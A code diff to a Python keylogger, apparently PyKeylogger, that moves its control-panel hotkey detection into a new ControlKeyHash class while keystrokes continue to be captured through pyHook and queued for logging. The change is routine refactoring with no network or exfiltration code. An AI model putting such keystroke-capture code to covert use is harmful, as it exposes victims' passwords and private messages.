@@ -24,6 +24,7 @@ import pyHook
 import time
 import pythoncom
 import sys
+import os
 import imp # don't need this anymore?
 from optparse import OptionParser
 import traceback
@@ -66,23 +67,24 @@ class KeyLogger:
 		pythoncom.PumpMessages()
 	
 	def ParseControlKey(self):
-		self.controlKeyList = self.settings['General']['Control Key'].split(';')
-		self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
-		self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
+		#~ self.controlKeyList = self.settings['General']['Control Key'].split(';')
+		#~ self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
+		#~ self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
+		self.ControlKeyHash = ControlKeyHash(self.settings['General']['Control Key'])
 		
-	def MaintainControlKeyHash(self, event, updown):
-		if updown == 'Down' and event.Key in self.controlKeyHash.keys():
-			self.controlKeyHash[event.Key] = True
-		if updown == 'Up' and event.Key in self.controlKeyHash.keys():
-			self.controlKeyHash[event.Key] = False
+	#~ def MaintainControlKeyHash(self, event, updown):
+		#~ if updown == 'Down' and event.Key in self.controlKeyHash.keys():
+			#~ self.controlKeyHash[event.Key] = True
+		#~ if updown == 'Up' and event.Key in self.controlKeyHash.keys():
+			#~ self.controlKeyHash[event.Key] = False
 
-	def CheckForControlEvent(self):
-		if self.cmdoptions.debug:
-			self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
-		if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
-			return True
-		else:
-			return False
+	#~ def CheckForControlEvent(self):
+		#~ if self.cmdoptions.debug:
+			#~ self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
+		#~ if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
+			#~ return True
+		#~ else:
+			#~ return False
 
 	def OnKeyDownEvent(self, event):
 		'''This function is the stuff that's supposed to happen when a key is pressed.
@@ -92,12 +94,17 @@ class KeyLogger:
 		#self.lw.WriteToLogFile(event)
 		self.q.put(event)
 		
-		self.MaintainControlKeyHash(event, 'Down')
+		#self.MaintainControlKeyHash(event, 'Down')
+		self.ControlKeyHash.update(event)
 		
-		if self.CheckForControlEvent():
+		#~ if self.CheckForControlEvent():
+		if self.cmdoptions.debug:
+				self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
+		if self.ControlKeyHash.check():
 			if not self.panel:
 				self.lw.PrintDebug("starting panel")
 				self.panel = True
+				self.ControlKeyHash.reset()
 				PyKeyloggerControlPanel(self.cmdoptions, self)
 
 		#~ if event.Key == self.settings['General']['Control Key']:
@@ -109,7 +116,8 @@ class KeyLogger:
 		return True
 	
 	def OnKeyUpEvent(self,event):
-		self.MaintainControlKeyHash(event, 'Up')
+		#self.MaintainControlKeyHash(event, 'Up')
+		self.ControlKeyHash.update(event)
 		return True
 	
 	def stop(self):
@@ -190,7 +198,33 @@ class KeyLogger:
 				root.destroy()
 				del(warn)
 				sys.exit()
-				
+
+class ControlKeyHash:
+	def __init__(self, controlkeysetting):
+		self.controlKeyList = controlkeysetting.split(';')
+		if os.name == 'nt':
+			self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
+		self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
+	
+	def update(self, event):
+		if event.MessageName == 'key down' and event.Key in self.controlKeyHash.keys():
+			self.controlKeyHash[event.Key] = True
+		if event.MessageName == 'key up' and event.Key in self.controlKeyHash.keys():
+			self.controlKeyHash[event.Key] = False
+	
+	def reset(self):
+		for key in self.controlKeyHash.keys():
+			self.controlKeyHash[key] = False
+	
+	def check(self):
+		if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
+			return True
+		else:
+			return False
+			
+	def __str__(self):
+		return str(self.controlKeyHash)
+
 if __name__ == '__main__':
 	
 	kl = KeyLogger()
